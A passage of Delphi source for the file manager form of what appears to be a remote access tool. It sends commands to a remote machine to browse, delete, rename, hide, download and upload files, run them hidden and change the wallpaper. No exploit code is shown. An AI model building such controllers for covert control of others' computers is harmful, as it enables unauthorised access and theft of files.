unit UnitFileManager;

interface

uses
  StrUtils,Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, ExtCtrls, UnitMain, Buttons, StdCtrls, VirtualTrees, CommCtrl,
  ImgList, Menus, AppEvnts, sTreeView, UnitConexao, sSkinProvider, UnitDownloadAll;

type
  TFormFileManager = class(TForm)
    StatusBar1: TStatusBar;
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    TabSheet3: TTabSheet;
    Panel2: TPanel;
    Splitter2: TSplitter;
    ListView2: TListView;
    PanelArquivos: TPanel;
    Splitter1: TSplitter;
    ListView1: TListView;
    TreeView1: TsTreeView;
    Panel1: TPanel;
    BitBtnBack: TSpeedButton;
    BitBtnUp: TSpeedButton;
    BitBtnForward: TSpeedButton;
    ComboBox1: TComboBox;
    VirtualStringTree1: TVirtualStringTree;
    Edit1: TLabeledEdit;
    Edit2: TLabeledEdit;
    CheckBox1: TCheckBox;
    Button1: TButton;
    Button2: TButton;
    PopupMenuTreeView: TPopupMenu;
    Novapasta1: TMenuItem;
    N1: TMenuItem;
    Deletar1: TMenuItem;
    Moverparalixeira1: TMenuItem;
    Renomear1: TMenuItem;
    N2: TMenuItem;
    Atualizarautomaticamente1: TMenuItem;
    PopupMenuListView: TPopupMenu;
    Executar2: TMenuItem;
    Normal1: TMenuItem;
    Oculto1: TMenuItem;
    Executar1: TMenuItem;
    N4: TMenuItem;
    Deletar2: TMenuItem;
    Moverparalixeira2: TMenuItem;
    Editar1: TMenuItem;
    N3: TMenuItem;
    Download1: TMenuItem;
    Upload1: TMenuItem;
    UploadFTP1: TMenuItem;
    Definircomopapeldeparede1: TMenuItem;
    Prviadasimagens1: TMenuItem;
    Iniciar1: TMenuItem;
    Definirtamanho1: TMenuItem;
    N5: TMenuItem;
    Abrirpastadedownloads1: TMenuItem;
    PopupMenuListView2: TPopupMenu;
    Executar4: TMenuItem;
    Normal2: TMenuItem;
    Oculto2: TMenuItem;
    Executar3: TMenuItem;
    MenuItem5: TMenuItem;
    Deletar3: TMenuItem;
    Moverparalixeira3: TMenuItem;
    Editar2: TMenuItem;
    MenuItem9: TMenuItem;
    Download2: TMenuItem;
    Definircomopapeldeparede2: TMenuItem;
    Prviadasimagens2: TMenuItem;
    Iniciar2: TMenuItem;
    Definirtamanho2: TMenuItem;
    MenuItem14: TMenuItem;
    Abrirpastadedownloads2: TMenuItem;
    PopupMenuTransfers: TPopupMenu;
    Iniciar3: TMenuItem;
    Parar1: TMenuItem;
    Excluir1: TMenuItem;
    N6: TMenuItem;
    Abrirpastadedownloads3: TMenuItem;
    ImageList1: TImageList;
    ImageListTreeView: TImageList;
    ImageListListView: TImageList;
    ImageListThumbs: TImageList;
    ImageListListView2: TImageList;
    ImageListThumbs2: TImageList;
    OpenDialog1: TOpenDialog;
    ApplicationEvents1: TApplicationEvents;
    Downloadfolder1: TMenuItem;
    DownloadFolder2: TMenuItem;
    Umarquivoporvez1: TMenuItem;
    Todasjuntas1: TMenuItem;
    Umarquivoporvez2: TMenuItem;
    Todasjuntas2: TMenuItem;
    Recursive1: TMenuItem;
    Recursive2: TMenuItem;
    sSkinProvider1: TsSkinProvider;
    N7: TMenuItem;
    CtrlC1: TMenuItem;
    CtrlV1: TMenuItem;
    Button3: TButton;
    Label1: TLabel;
    RAR1: TMenuItem;
    UnRAR1: TMenuItem;
    procedure FormCreate(Sender: TObject);
    procedure TreeView1Click(Sender: TObject);
    procedure TreeView1DblClick(Sender: TObject);
    procedure Atualizarautomaticamente1Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure BitBtnBackClick(Sender: TObject);
    procedure BitBtnUpClick(Sender: TObject);
    procedure BitBtnForwardClick(Sender: TObject);
    procedure Upload1Click(Sender: TObject);
    procedure UploadFTP1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Novapasta1Click(Sender: TObject);
    procedure Executar1Click(Sender: TObject);
    procedure Executar3Click(Sender: TObject);
    procedure Excluir1Click(Sender: TObject);
    procedure Abrirpastadedownloads1Click(Sender: TObject);
    procedure ListView1ColumnClick(Sender: TObject; Column: TListColumn);
    procedure ListView1DblClick(Sender: TObject);
    procedure ListView1KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure ListView1SelectItem(Sender: TObject; Item: TListItem;
      Selected: Boolean);
    procedure ListView2ColumnClick(Sender: TObject; Column: TListColumn);
    procedure ListView2DblClick(Sender: TObject);
    procedure ListView2KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure ApplicationEvents1Message(var Msg: tagMSG; var Handled: Boolean);
    procedure FormShow(Sender: TObject);
    procedure Parar1Click(Sender: TObject);
    procedure PopupMenuListView2Popup(Sender: TObject);
    procedure PopupMenuListViewPopup(Sender: TObject);
    procedure PopupMenuTransfersPopup(Sender: TObject);
    procedure PopupMenuTreeViewPopup(Sender: TObject);
    procedure Definircomopapeldeparede1Click(Sender: TObject);
    procedure Definircomopapeldeparede2Click(Sender: TObject);
    procedure Deletar1Click(Sender: TObject);
    procedure Moverparalixeira1Click(Sender: TObject);
    procedure Renomear1Click(Sender: TObject);
    procedure Normal1Click(Sender: TObject);
    procedure Oculto1Click(Sender: TObject);
    procedure Normal2Click(Sender: TObject);
    procedure Oculto2Click(Sender: TObject);
    procedure Deletar2Click(Sender: TObject);
    procedure Moverparalixeira2Click(Sender: TObject);
    procedure Edit1KeyPress(Sender: TObject; var Key: Char);
    procedure Edit2KeyPress(Sender: TObject; var Key: Char);
    procedure Editar1Click(Sender: TObject);
    procedure Iniciar1Click(Sender: TObject);
    procedure Iniciar2Click(Sender: TObject);
    procedure Iniciar3Click(Sender: TObject);
    procedure Definirtamanho1Click(Sender: TObject);
    procedure Deletar3Click(Sender: TObject);
    procedure ComboBox1Change(Sender: TObject);
    procedure ComboBox1CloseUp(Sender: TObject);
    procedure ComboBox1KeyPress(Sender: TObject; var Key: Char);
    procedure Moverparalixeira3Click(Sender: TObject);
    procedure Editar2Click(Sender: TObject);
    procedure VirtualStringTree1GetImageIndex(Sender: TBaseVirtualTree;
      Node: PVirtualNode; Kind: TVTImageKind; Column: TColumnIndex;
      var Ghosted: Boolean; var ImageIndex: Integer);
    procedure VirtualStringTree1GetNodeDataSize(Sender: TBaseVirtualTree;
      var NodeDataSize: Integer);
    procedure VirtualStringTree1GetText(Sender: TBaseVirtualTree;
      Node: PVirtualNode; Column: TColumnIndex; TextType: TVSTTextType;
      var CellText: string);
    procedure VirtualStringTree1PaintText(Sender: TBaseVirtualTree;
      const TargetCanvas: TCanvas; Node: PVirtualNode; Column: TColumnIndex;
      TextType: TVSTTextType);
    procedure Downloadfolder1Click(Sender: TObject);
    procedure DownloadFolder2Click(Sender: TObject);
    procedure Todasjuntas1Click(Sender: TObject);
    procedure Umarquivoporvez1Click(Sender: TObject);
    procedure Todasjuntas2Click(Sender: TObject);
    procedure Umarquivoporvez2Click(Sender: TObject);
    procedure Recursive1Click(Sender: TObject);
    procedure Recursive2Click(Sender: TObject);
    procedure CtrlC1Click(Sender: TObject);
    procedure CtrlV1Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure RAR1Click(Sender: TObject);
    procedure UnRAR1Click(Sender: TObject);
  private
    { Private declarations }
    DownloadAllFile: string;
    ThumbQuality: integer;
    FirstTime: boolean;
    WM_GETIMAGE: cardinal;
    Servidor: TConexaoNew;
    SelectedNode: array [1..99999] of TTreeNode;
    NodeAtual: integer;
    ExtensionList: TStringList;
    FileType: array [0..10000] of shortstring;
    FolderIcon: integer;
    FolderIconListView: integer;
    FolderIconSelected: integer;
    SharedDrive: TTreeNode;
    IncompletosCarregados: boolean;
    LastUploadFolder, LastComBoxText: string;
    DirList: TStringList;
    DirListPosition: integer;
    SpecialNode: TTreeNode;
    PossoBaixarPasta: boolean;
    ListaArquivosPasta: string;
    OneByOneList: string;
    ToCopy: string;

    FMTHUMBS_SEARCH_STARTED: boolean;
    FMTHUMBS_STARTED: boolean;
    FMFILELIST_STARTED: boolean;
    FMFILESEARCHLIST_STARTED: boolean;
    FMFOLDERLIST_STARTED: boolean;

    NomePC, LastFTPAddress, LastFTPFolder, LastFTPUser, LastFTPPass: string;
    LiberarForm: boolean;
    FormDownloadAll: TFormDownloadAll;
  	procedure WMCloseFree(var Message: TMessage); message WM_CLOSEFREE;
    procedure AtualizarIdiomas;
    procedure LoadFiles(Stream: TMemoryStream; Node: TTreeNode);
    procedure LoadFiles2(Stream: TMemoryStream; FolderName: string);
    procedure LoadSearchFiles(Files: String);
    procedure LoadFolders(Stream: TMemoryStream; Node: TTreeNode);
    procedure LoadFolders2(Stream: TMemoryStream; FolderName: string);
    procedure EnviarListarDir(node: TTreeNode);
    procedure ExcluirTransferencia(selectedonly: boolean = true);
    function GetFileTypeDescription(Ext: String): String;
    procedure LoadIncompletes;
    procedure PararTransferencia(Node: pVirtualNode);
    procedure IniciarTransferencia(Node: pVirtualNode);
    procedure IniciarListagem(DirName: string);
    function CheckDownloadList(FileName: string): boolean;
    procedure UpdateFileIcons(ListView: TListView);
  	procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
  	procedure AtivarRARPlugin(var Message: TMessage); message WM_RARPLUGINOK;
    procedure CreateParams(var Params : TCreateParams); override;
  public
    { Public declarations }
    procedure OnRead(Recebido: String; ConAux: TConexaoNew); overload;
    procedure IniciarDownloadAll(h: THandle);
    constructor Create(aOwner: TComponent; ConAux: TConexaoNew); overload;
  end;

function GetAttrib(FindData: TWIN32FindData):string;
function FileTimeToDateTime(FileTime : TFileTime) : TDateTime;

var
  FormFileManager: TFormFileManager;
  ThumbSize: integer = 90;

implementation

{$R *.dfm}

uses
  CustomIniFiles,
  UnitStrings,
  UnitConstantes,
  UnitFTPSettings,
  UnitFMPreview,
  UnitExecParam,
  ShellAPI,
  DateUtils,
  AS_ShellUtils,
  UnitFMEdit,
  UnitCommonProcedures,
  JPEG;

//procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
procedure TFormFileManager.WMAtualizarIdioma(var Message: TMessage);
begin
  AtualizarIdiomas;
end;

procedure TFormFileManager.AtivarRARPlugin(var Message: TMessage);
begin
  Rar1.Visible := True;
  UnRar1.Visible := True;
end;

//Here's the implementation of CreateParams
procedure TFormFileManager.CreateParams(var Params : TCreateParams);
begin
  inherited CreateParams(Params); //Don't ever forget to do this!!!
  if FormMain.ControlCenter = True then Exit;
  Params.WndParent := GetDesktopWindow;
end;

procedure TFormFileManager.WMCloseFree(var Message: TMessage);
begin
  LiberarForm := True;
  Close;
end;

type
  TDirDados = class
    Info: string;
end;

type
  TFileDados = class
    FileName: string;
    FileSize: int64;
end;

type
  TempFileInfo = class
    Extension: shortstring;
    ExtensionIndex: integer;
end;

var
  LastSortedColumn: TListColumn;
  Ascending: boolean;
  AtuializandoTimer: boolean = false;
  TamanhoBarra: integer = 0;
  PrimeiraPos: integer = 0;
  ImgType: array [0..10] of string = ('bmp',
                                     'dib',
                                     'jpg',
                                     'jpeg',
                                     'jpe',
                                     'ico',
                                     'jfif',
                                     'gif',
                                     'png',
                                     'tif',
                                     'tiff');

function IntToStr(i: Int64): String;
begin
  Str(i, Result);
end;

function StrToInt(S: String): Int64;
var
  E: integer;
begin
  Val(S, Result, E);
end;

function PossoMexer(FileName: string): boolean;
var
  FS: TFileStream;
begin
  result := true;
  try
    FS := TFileStream.Create(Filename, fmOpenRead);
    except
    result := false;
  end;
  FreeAndNil(FS);
end;

function MyTempFolder: String;
var
  lpBuffer: array of WideChar;
begin
  SetLength(lpBuffer, MAX_PATH * 2);
  GetTempPath(MAX_PATH, pWideChar(lpBuffer));
  Result := pWideChar(lpBuffer);
end;

function IsImageFile(Arquivo: string): boolean;
var
  i: integer;
begin
  result := false;
  for i := 0 to high(ImgType) do
  begin
    if lowercase(ExtractfileExt(Arquivo)) = '.' + ImgType[i] then
    begin
      result := true;
      break;
    end;
  end;
end;

function GetFullPath(Node: TTreeNode): string;
begin
  Result := Node.Text;
  while Node.Parent <> nil do
  begin
    Node := Node.Parent;
    Result := IncludeTrailingBackSlash(Node.Text) + IncludeTrailingBackSlash(Result);
  end;
  if traduzidos[280] <> '' then
  begin
    if posex(traduzidos[280] + '\', Result) > 0 then delete(result, 1, posex('\', Result)) else
    if result = traduzidos[280] then result := '';
  end;

  if traduzidos[308] <> '' then
  begin
    if posex(traduzidos[308] + '\', Result) > 0 then delete(result, 1, posex('\', Result)) else
    if result = traduzidos[308] then result := '';
  end;

  if traduzidos[309] <> '' then
  begin
    if posex(traduzidos[309] + '\', Result) > 0 then delete(result, 1, posex('\', Result)) else
    if result = traduzidos[309] then result := '';
  end;

  if result <> '' then
  if result[length(result)] <> '\' then result := result + '\';
end;

function StringCount(MainStr, Str: String): integer;
var
  i: integer;
  s: string;
begin
  result := 0;
  if MainStr = '' then exit;
  if Length(Str) > Length(MainStr) then Exit;

  s := MainStr;
  while posex(str, s) > 0 do
  begin
    inc(result);
    delete(s, 1, posex(Str, s));
  end;
end;

function FileTimeToDateTime(FileTime : TFileTime) : TDateTime;
var
  LocalTime : TFileTime;
  SystemTime : TSystemTime;
begin
  Result := EncodeDate(1900,1,1);
  FileTimeToLocalFileTime(FileTime, LocalTime);
  FileTimeToSystemTime(LocalTime, SystemTime);
  Result := SystemTimeToDateTime(SystemTime);
end;

function GetAttrib(FindData: TWIN32FindData):string;
begin
(*
# R : Atributo somente leitura
# A : Atributo de arquivo morto
# S : Atributo de arquivo do sistema
# H : Atributo de arquivo oculto
*)
  Result := '';
  if (FindData.dwFileAttributes and FILE_ATTRIBUTE_ARCHIVE) <> 0 then Result := Result + 'A';
  if (FindData.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) <> 0 then Result := Result + 'D';
  if (FindData.dwFileAttributes and FILE_ATTRIBUTE_HIDDEN) <> 0 then Result := Result + 'H';
  if (FindData.dwFileAttributes and FILE_ATTRIBUTE_READONLY) <> 0 then Result := Result + 'R';
  if (FindData.dwFileAttributes and FILE_ATTRIBUTE_SYSTEM) <> 0 then Result := Result + 'S';
end;

function SortByColumn(Item1, Item2: TListItem; Data: integer): integer; stdcall;
var
  n1,n2: int64;
  s1,s2: string;
  ex1,ex2: extended;
  num: integer;
  Date1,Date2: TDateTime;
begin
  if (LastSortedColumn.Index = 1) or
     (LastSortedColumn.Index = 4) then
  begin
    if LastSortedColumn.Index = 1 then
    begin
       n1 := StrToIntDef(Inttostr(int64(Item1.SubItems.Objects[0])),0);
       n2 := StrToIntDef(Inttostr(int64(Item2.SubItems.Objects[0])),0);
    end;

    if LastSortedColumn.Index = 4 then
    begin
      try
        Date1 := StrToDateTime(Copy(Item1.SubItems[3], 1, posex(' ', Item1.SubItems[3]) - 1));
        except
      end;
      try
        Date2 := StrToDateTime(Copy(Item2.SubItems[3], 1, posex(' ', Item2.SubItems[3]) - 1));
        except
      end;
      Result := CompareDateTime(Date1, Date2);
      if not Ascending then Result := - Result;
      exit;
    end;
    if (n1 = n2) then Result := 0 else if (n1 > n2) then Result := 1 else Result := -1;

  end else
  begin
    Result := 0;
    if Data = 0 then Result := AnsiCompareText(Item1.Caption, Item2.Caption)
    else Result := AnsiCompareText(Item1.SubItems[Data-1],Item2.SubItems[Data-1]);
  end;

  if not Ascending then Result := -Result;
end;

procedure TFormFileManager.LoadFiles(Stream: TMemoryStream; Node: TTreeNode);
var
  Li: TListItem;
  FindData: TWIN32FindData;
  FileDados: TFileDados;
  TempSize: int64;
begin
  ZeroMemory(@FileType, SizeOf(FileType));

  while Stream.Position < Stream.Size do
  begin
    Stream.ReadBuffer(FindData, SizeOf(TWIN32FindData));
    Li := ListView1.Items.Add;
    Li.Caption := FindData.cFileName;

    TempSize := Int64(FindData.nFileSizeHigh);
    TempSize := TempSize shl 32;
    TempSize := TempSize + int64(FindData.nFileSizeLow);

    Li.SubItems.AddObject(FileSizeToStr(TempSize), TObject(TempSize));
    Li.SubItems.Add(GetAttrib(FindData));
    if extractfileext(FindData.cFileName) = '' then
      Li.SubItems.Add(uppercase('.' + traduzidos[310])) else
      Li.SubItems.Add(uppercase(extractfileext(FindData.cFileName)));
    Li.SubItems.Add(DateTimeToStr(FileTimeToDateTime(FindData.ftCreationTime)));

    FileDados := TFileDados.Create;
    FileDados.FileName := GetFullPath(Node) + string(FindData.cFileName);
    FileDados.FileSize := FindData.nFileSizeLow;

    Li.Data := TObject(FileDados);
  end;
end;

procedure TFormFileManager.LoadFiles2(Stream: TMemoryStream; FolderName: string);
var
  Li: TListItem;
  FindData: TWIN32FindData;
  FileDados: TFileDados;
  TempSize: int64;
begin
  ZeroMemory(@FileType, SizeOf(FileType));

  while Stream.Position < Stream.Size do
  begin
    Stream.ReadBuffer(FindData, SizeOf(TWIN32FindData));
    Li := ListView1.Items.Add;
    Li.Caption := FindData.cFileName;

    TempSize := int64(FindData.nFileSizeHigh);
    TempSize := TempSize shl 32;
    TempSize := TempSize + Int64(FindData.nFileSizeLow);

    Li.SubItems.AddObject(FileSizeToStr(TempSize), TObject(TempSize));
    Li.SubItems.Add(GetAttrib(FindData));
    if extractfileext(FindData.cFileName) = '' then
      Li.SubItems.Add(uppercase('.' + traduzidos[310])) else
      Li.SubItems.Add(uppercase(extractfileext(FindData.cFileName)));
    Li.SubItems.Add(DateTimeToStr(FileTimeToDateTime(FindData.ftCreationTime)));

    FileDados := TFileDados.Create;
    FileDados.FileName := FolderName + string(FindData.cFileName);
    FileDados.FileSize := FindData.nFileSizeLow;

    Li.Data := TObject(FileDados);
  end;
end;

procedure TFormFileManager.LoadSearchFiles(Files: String);
var
  Li: TListItem;
  FindData: TWIN32FindData;
  TempDir: string;
  Tempstr: string;
{
  MS: TMemoryStream;
  RecDownloadAll: TRecDownloadAll;
}
begin
{
  //TESTE...
  MS := TMemoryStream.Create;
  MS.Write(RecDownloadAll, SizeOf(RecDownloadAll));
  MS.Write(Files[1], Length(Files) * 2);
  MS.Position := 0;
  MS.SaveToFile(DownloadAllFile);
  MS.Free;
}

  if ListView2.Items.Count > 0 then ListView2.Items.Clear;
  ZeroMemory(@FileType, SizeOf(FileType));

  TempStr := Files;

  while TempStr <> '' do
  begin
    TempDir := copy(TempStr, 1, posex(delimitadorComandos, TempStr) - 1);
    delete(TempStr, 1, posex(delimitadorComandos, TempStr) - 1);
    delete(TempStr, 1, length(delimitadorComandos));
    ZeroMemory(@FindData, SizeOf(TWIN32FindData));
    CopyMemory(@FindData, @TempStr[1], SizeOf(TWIN32FindData));
    delete(TempStr, 1, SizeOf(TWIN32FindData));

    Li := ListView2.Items.Add;
    Li.Caption := TempDir + string(FindData.cFileName);
    Li.SubItems.AddObject(FileSizeToStr(FindData.nFileSizeLow), TObject(FindData.nFileSizeLow));
    Li.SubItems.Add(GetAttrib(FindData));
    Li.SubItems.Add(uppercase(extractfileext(FindData.cFileName)));
    Li.SubItems.Add(DateTimeToStr(FileTimeToDateTime(FindData.ftCreationTime)));
    LI.ImageIndex := - 1;
  end;
end;

procedure TFormFileManager.Moverparalixeira1Click(Sender: TObject);
begin
  SelectedNode[NodeAtual] := Treeview1.Selected;

  if MessageBox(Handle,
                pwidechar(GetFullPath(Treeview1.Selected) + #13#10 + traduzidos[377] + '?'),
                pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_YESNO or MB_ICONQUESTION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> idYes then exit;

  Servidor.EnviarString(FMDELETARPASTALIXO + '|' + IntToStr(NodeAtual) + '|' +
               GetFullPath(TreeView1.Selected) + delimitadorComandos);
  statusbar1.Panels.Items[0].Text := traduzidos[205];
  inc(NodeAtual);
end;

procedure TFormFileManager.Deletar2Click(Sender: TObject);
var
  i: integer;
  TempStr: string;
begin
  if MessageBox(Handle,
                pwidechar(traduzidos[380] + '?'),
                pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_YESNO or MB_ICONQUESTION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> idYes then exit;

  for i := 0 to ListView1.Items.Count - 1 do
  if ListView1.Items.Item[i].Selected = true then
  TempStr := TempStr + TFileDados(ListView1.Items.Item[i].Data).FileName + delimitadorComandos;
  Servidor.EnviarString(FMDELETARARQUIVO + '|' + TempStr);
end;

procedure TFormFileManager.Deletar3Click(Sender: TObject);
var
  i: integer;
  TempStr: string;
begin
  if MessageBox(Handle,
                pwidechar(traduzidos[380]),
                pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_YESNO or MB_ICONQUESTION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> idYes then exit;

  for i := 0 to ListView2.Items.Count - 1 do
  if ListView2.Items.Item[i].Selected = true then
  TempStr := TempStr + ListView2.Items.Item[i].Caption + delimitadorComandos;
  Servidor.EnviarString(FMDELETARARQUIVO + '|' + TempStr);
end;

procedure TFormFileManager.Downloadfolder1Click(Sender: TObject);
var
  TempStr: string;
begin
  PossoBaixarPasta := True;
  TempStr := TFileDados(ListView1.Selected.Data).FileName;
  Servidor.EnviarString(FMDOWNLOADFOLDER + '|' + TempStr);
  statusbar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormFileManager.DownloadFolder2Click(Sender: TObject);
var
  TempStr: string;
begin
  PossoBaixarPasta := True;
  TempStr := GetFullPath(TreeView1.Selected);
  Servidor.EnviarString(FMDOWNLOADFOLDER + '|' + TempStr);
  statusbar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormFileManager.Moverparalixeira2Click(Sender: TObject);
var
  i: integer;
  TempStr: string;
begin
  if MessageBox(Handle,
                pwidechar(traduzidos[380] + '?'),
                pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_YESNO or MB_ICONQUESTION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> idYes then exit;

  for i := 0 to ListView1.Items.Count - 1 do
  if ListView1.Items.Item[i].Selected = true then
  TempStr := TempStr + TFileDados(ListView1.Items.Item[i].Data).FileName + delimitadorComandos;
  Servidor.EnviarString(FMDELETARARQUIVOLIXO + '|' + TempStr);
end;

procedure TFormFileManager.Moverparalixeira3Click(Sender: TObject);
var
  i: integer;
  TempStr: string;
begin
  if MessageBox(Handle,
                pwidechar(traduzidos[380]),
                pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_YESNO or MB_ICONQUESTION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> idYes then exit;

  for i := 0 to ListView2.Items.Count - 1 do
  if ListView2.Items.Item[i].Selected = true then
  TempStr := TempStr + ListView2.Items.Item[i].Caption + delimitadorComandos;
  Servidor.EnviarString(FMDELETARARQUIVOLIXO + '|' + TempStr);
end;

procedure TFormFileManager.Novapasta1Click(Sender: TObject);
var
  New: string;
begin
  New := traduzidos[311];
  if InputQuery(traduzidos[311], traduzidos[336] + ':', New) = true then
  begin
    SelectedNode[NodeAtual] := Treeview1.Selected;
    Servidor.EnviarString(FMCRIARPASTA + '|' + IntToStr(NodeAtual) + '|' +
                 GetFullPath(TreeView1.Selected) + New + delimitadorComandos);
    Statusbar1.Panels.Items[0].Text := traduzidos[205];
    inc(NodeAtual);
  end;
end;

procedure TFormFileManager.LoadFolders(Stream: TMemoryStream; Node: TTreeNode);
var
  Tn: TTreeNode;
  Item: TListItem;
  FindData: TWIN32FindData;
  Dados: TDirDados;
  TempStr: WideString;
begin
  if ListView1.Items.Count > 0 then ListView1.Items.Clear;

  Node.DeleteChildren;
  while Stream.Position < Stream.Size do
  begin
    Stream.ReadBuffer(FindData, SizeOf(TWIN32FindData));
    if string(FindData.cFileName) = '.' then Continue;
    if FindData.cFileName = '..' then Continue;

    TempStr := string(FindData.cFileName);
    Delete(TempStr, 1, LastDelimiter('\', TempStr));
    Item := ListView1.Items.Add;

    Dados := TDirDados.Create;
    Dados.Info := GetFullPath(node) + FindData.cFileName;

    Item.Caption := TempStr;
    Item.SubItems.Add('');
    Item.SubItems.Add(GetAttrib(FindData));
    Item.SubItems.Add(Traduzidos[50]);
    Item.SubItems.Add(DateTimeToStr(FileTimeToDateTime(FindData.ftLastAccessTime)));
    Item.ImageIndex := FolderIconListView;
    Item.Data := TObject(Dados);
    if posex('H', Item.SubItems[1]) > 0 then Item.Cut := True;

    Tn := Treeview1.Items.AddChild(Node, FindData.cFileName);
    if posex('H', GetAttrib(FindData)) > 0 then tn.Cut := True;

    Tn.ImageIndex := FolderIcon;
    Tn.SelectedIndex := FolderIconSelected;

    Dados := TDirDados.Create;
    Dados.Info := Traduzidos[377] + ': ' + DateTimeToStr(FileTimeToDateTime(FindData.ftLastAccessTime)) + ' --- ' + Traduzidos[212] + ': ' + GetAttrib(FindData);
    Tn.Data := TOBject(Dados);

    Item.SubItems.Objects[3] := TOBject(Dados);
  end;
  Node.Expand(False);
end;

procedure TFormFileManager.LoadFolders2(Stream: TMemoryStream; FolderName: string);
var
  Item: TListItem;
  FindData: TWIN32FindData;
  Dados: TDirDados;
  TempStr: WideString;
begin
  if ListView1.Items.Count > 0 then ListView1.Items.Clear;

  while Stream.Position < Stream.Size do
  begin
    Stream.ReadBuffer(FindData, SizeOf(TWIN32FindData));
    if string(FindData.cFileName) = '.' then Continue;
    if FindData.cFileName = '..' then Continue;

    TempStr := string(FindData.cFileName);
    Delete(TempStr, 1, LastDelimiter('\', TempStr));
    Item := ListView1.Items.Add;

    Dados := TDirDados.Create;
    Dados.Info := FolderName + FindData.cFileName;

    Item.Caption := TempStr;
    Item.SubItems.Add('');
    Item.SubItems.Add(GetAttrib(FindData));
    Item.SubItems.Add(Traduzidos[50]);
    Item.SubItems.Add(DateTimeToStr(FileTimeToDateTime(FindData.ftLastAccessTime)));
    Item.ImageIndex := FolderIconListView;
    Item.Data := TObject(Dados);
    if posex('H', Item.SubItems[1]) > 0 then Item.Cut := True;

    Dados := TDirDados.Create;
    Dados.Info := Traduzidos[377] + ': ' + DateTimeToStr(FileTimeToDateTime(FindData.ftLastAccessTime)) + ' --- ' + Traduzidos[212] + ': ' + GetAttrib(FindData);
    Item.SubItems.Objects[3] := TOBject(Dados);
  end;
end;

procedure TFormFileManager.Edit1KeyPress(Sender: TObject; var Key: Char);
begin
  if key = #13 then Button1Click(Button1);
end;

procedure TFormFileManager.Edit2KeyPress(Sender: TObject; var Key: Char);
begin
  if key = #13 then Button1Click(Button1);
end;

procedure TFormFileManager.Editar1Click(Sender: TObject);
var
  Form: TFormFMEdit;
  Atributos: string;
  OldName, NewName: string;
begin
  Form := TFormFMEdit.create(application);
  try
    Form.Caption := traduzidos[265];

    if posex('H', ListView1.Selected.SubItems.Strings[1]) > 0 then
      Form.CheckBox1.Checked := true else
      Form.CheckBox1.Checked := false;
    if posex('S', ListView1.Selected.SubItems.Strings[1]) > 0 then
      Form.CheckBox2.Checked := true else
      Form.CheckBox2.Checked := false;
    if posex('R', ListView1.Selected.SubItems.Strings[1]) > 0 then
      Form.CheckBox3.Checked := true else
      Form.CheckBox3.Checked := false;

    OldName := TFileDados(ListView1.Selected.Data).FileName;
    Form.Edit1.Text := ExtractFileName(OldName);
    Form.Label1.Caption := ListView1.Column[0].Caption;
    Form.CheckBox1.Caption := traduzidos[384];
    Form.CheckBox2.Caption := traduzidos[383];
    Form.CheckBox3.Caption := traduzidos[381];
    Atributos := '';

    if (ListView1.Selected.SubItems.Objects[0] = nil) and (ListView1.Selected.SubItems.strings[0] = '') then
    Atributos := 'D' else Atributos := 'A';

    if Form.ShowModal = mrOK then
    begin
      if Form.CheckBox1.Checked = true then Atributos := Atributos + 'H';
      if Form.CheckBox2.Checked = true then Atributos := Atributos + 'S';
      if Form.CheckBox3.Checked = true then Atributos := Atributos + 'R';
      NewName := ExtractFilePath(OldName) + Form.Edit1.Text;
      Servidor.enviarString(
                   FMEDITARARQUIVO + '|' +
                   OldName + delimitadorComandos +
                   NewName + delimitadorComandos +
                   Atributos + delimitadorComandos);
    end;
    finally
    Form.Release;
    Form := nil;
  end;
end;

procedure TFormFileManager.Editar2Click(Sender: TObject);
var
  Form: TFormFMEdit;
  Atributos: string;
  OldName, NewName: string;
begin
  Form := TFormFMEdit.create(application);
  try
    Form.Caption := Editar2.Caption;

    if posex('H', ListView2.Selected.SubItems.Strings[1]) > 0 then
      Form.CheckBox1.Checked := true else
      Form.CheckBox1.Checked := false;
    if posex('S', ListView2.Selected.SubItems.Strings[1]) > 0 then
      Form.CheckBox2.Checked := true else
      Form.CheckBox2.Checked := false;
    if posex('R', ListView2.Selected.SubItems.Strings[1]) > 0 then
      Form.CheckBox3.Checked := true else
      Form.CheckBox3.Checked := false;

    OldName := ListView2.Selected.Caption;
    Form.Edit1.Text := ExtractFileName(OldName);
    Form.Label1.Caption := ListView2.Column[0].Caption;
    Form.CheckBox1.Caption := traduzidos[384];
    Form.CheckBox2.Caption := traduzidos[383];
    Form.CheckBox3.Caption := traduzidos[381];
    Atributos := '';

    if Form.ShowModal = mrOK then
    begin
      if Form.CheckBox3.Checked = true then Atributos := Atributos + 'R';
      if Form.CheckBox2.Checked = true then Atributos := Atributos + 'S';
      if Form.CheckBox1.Checked = true then Atributos := Atributos + 'H';
      NewName := ExtractFilePath(OldName) + Form.Edit1.Text;
      Servidor.enviarString(
                   FMEDITARARQUIVO + '|' +
                   OldName + delimitadorComandos +
                   NewName + delimitadorComandos +
                   Atributos + delimitadorComandos);
    end;
    finally
    Form.Release;
    Form := nil;
  end;
end;

procedure TFormFileManager.BitBtnBackClick(Sender: TObject);
